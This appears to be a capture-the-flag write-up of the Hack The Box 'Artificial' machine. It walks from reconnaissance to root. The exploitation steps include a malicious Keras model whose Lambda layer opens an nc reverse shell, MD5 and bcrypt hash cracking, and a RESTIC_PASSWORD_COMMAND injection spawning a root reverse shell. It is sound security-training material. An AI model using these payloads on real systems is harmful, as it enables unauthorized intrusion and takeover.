---
categories:
- Hackthebox
image:
  path: art.png
layout: post
media_subpath: /assets/images/artificial
tags:
- hackthebox
- writeup
- linux
- tensorflow
- deserialization
- cve-2021-37678
- keras
- sqlite
- md5-cracking
- ssh
- backrest
- environment-injection
- medium
title: HTB - Artificial Walkthrough
---

# Introduction

Artificial is a Linux machine that involves exploiting a machine learning application vulnerable to a known TensorFlow deserialization vulnerability. Initial access is gained by uploading a malicious model, leading to remote code execution. Lateral movement is achieved by cracking a password hash found in a database file, and privilege escalation is performed by exploiting environment variable injection in a backup service.

## Reconnaissance

The initial reconnaissance begins with an `nmap` scan to identify open ports and services.
```
nmap -sC -sV -oA nmap/artificial 10.10.11.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 20:20 EAT
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
**Key Findings:**
- **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu)
- **Port 80/tcp:** nginx 1.18.0 (Ubuntu)
    - Redirected to `http://artificial.htb`
    - Domain: `artificial.htb` Added domain to hosts file for proper DNS resolution:

```
echo "10.10.11.74     artificial.htb" | tee -a /etc/hosts
```

### Port 80

The web application was identified as an AI platform.

![img](Pasted image 20250622072610.png)

Directory enumeration revealed accessible endpoints:
- `/login` - User authentication
- `/register` - Account registration
- `/dashboard` - Authenticated user portal

```
ffuf -u http://artificial.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -ic -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://artificial.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 857, Words: 162, Lines: 29, Duration: 208ms]
                        [Status: 200, Size: 5442, Words: 1267, Lines: 162, Duration: 202ms]
register                [Status: 200, Size: 952, Words: 182, Lines: 34, Duration: 202ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 172ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 202ms]
                        [Status: 200, Size: 5442, Words: 1267, Lines: 162, Duration: 171ms]
:: Progress: [207630/207630] :: Job [1/1] :: 239 req/sec :: Duration: [0:16:55] :: Errors: 0 ::
```


## Initial Access

### Web Application Registration

A user account was successfully registered with credentials `null@byte.com:password`, providing access to the model deployment dashboard.

![img](Pasted image 20250622073129.png)

### TensorFlow RCE Exploitation

Analysis of the application's `Dockerfile` and `requirements.txt` revealed dependency on TensorFlow 2.13.1. Research identified a known vulnerability (CVE-2021-37678) allowing remote code execution through malicious Keras models.
**Exploit Development:**
A malicious model was created using a Lambda layer to execute a reverse shell payload:
```
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 9001 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Lambda(exploit))
model.save("exploit.h5")
```
**Execution:**  
Uploading the malicious model triggered the payload, establishing a reverse shell as the `app` user.
```
rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.74] 39944
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Lateral Movement

### Database Analysis

Within the application instance directory, the SQLite database `users.db` was discovered and extracted. It contained user credentials with MD5 hashes.

![img](Pasted image 20250622091454.png)

### Credential Cracking

Looking at `/etc/passwd` I notice their is a user `gael and app`
```
cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```
The MD5 hash for user `gael` was successfully cracked:

![img](Pasted image 20250622091527.png)

### SSH Access

The cracked credentials provided SSH access to the system as user `gael`
```
ssh gael@artificial.htb                      
The authenticity of host 'artificial.htb (10.129.46.4)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 25 Oct 2025 02:47:52 PM UTC

  System load:           0.0
  Usage of /:            66.4% of 7.53GB
  Memory usage:          30%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.46.4
  IPv6 address for eth0: dead:beef::250:56ff:fe94:b240


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Oct 25 14:47:54 2025 from 10.10.14.231
gael@artificial:~$ 
```
User flag located at: `/home/gael/user.txt`

## Privilege Escalation

### Service Discovery

Looking at `/opt` we find `backrest` is installed

```
gael@artificial:~$ cd /opt
gael@artificial:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Mar  4  2025 .
drwxr-xr-x 18 root root 4096 Mar  3  2025 ..
drwxr-xr-x  5 root root 4096 Oct 25 14:50 backrest
```

Network enumeration revealed a `backrest` backup service running locally on port 9898. 

```
gael@artificial:/opt/backrest$ ss -tunlp
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port      Process      
udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                      
udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                      
tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                      
tcp        LISTEN      0           2048                 127.0.0.1:5000                0.0.0.0:*                      
tcp        LISTEN      0           4096                 127.0.0.1:9898                0.0.0.0:*                      
tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*                      
tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                      
tcp        LISTEN      0           128                       [::]:22                     [::]:*                      
tcp        LISTEN      0           511                       [::]:80                     [::]:*                      
gael@artificial:/opt/backrest$ 
```

Port forwarding enabled interaction with the service:

```
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb -fN
```

### Backup Configuration Analysis
The user `gael` belonged to the `sysadm` group, which had read access to backup archives in `/var/backups/`. The `backrest_backup.tar.gz` archive was retrieved

```
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz  backrest_backup.tar.gz 
gael@artificial.htb's password: 
backrest_backup.tar.gz                                                             100%   50MB  52.3KB/s   16:17
```

Analysing, revealing configuration files containing a bcrypt hash for the `backrest_root` account.

```
cat config.json    
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

### Backrest Authentication 

The bcrypt hash was cracked using John the Ripper, revealing the password `!@#$%^`. This provided administrative access to the `backrest` web interface.

```
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > hashes/artifical.hash

john hashes/artifical.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)     
1g 0:00:01:37 DONE (2025-10-25 19:12) 0.01030g/s 55.63p/s 55.63c/s 55.63C/s baby16..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Command Injection via Environment Variable

The `backrest` repository configuration allowed setting the `RESTIC_PASSWORD_COMMAND` environment variable, which was vulnerable to command injection:
**Injection Payload:**

```
RESTIC_PASSWORD_COMMAND=busybox nc 10.10.14.231 9001 -e /bin/bash
```

**Result:**  

Triggering a backup operation with this configuration executed the payload with root privileges, establishing a reverse shell as the `root` user and enabling capture of the root flag.

```
rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.231] from (UNKNOWN) [10.129.46.4] 46166
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@artificial:/# export TERM=xterm
export TERM=xterm
root@artificial:/# 

```
Root flag located at: `/root/root.txt`

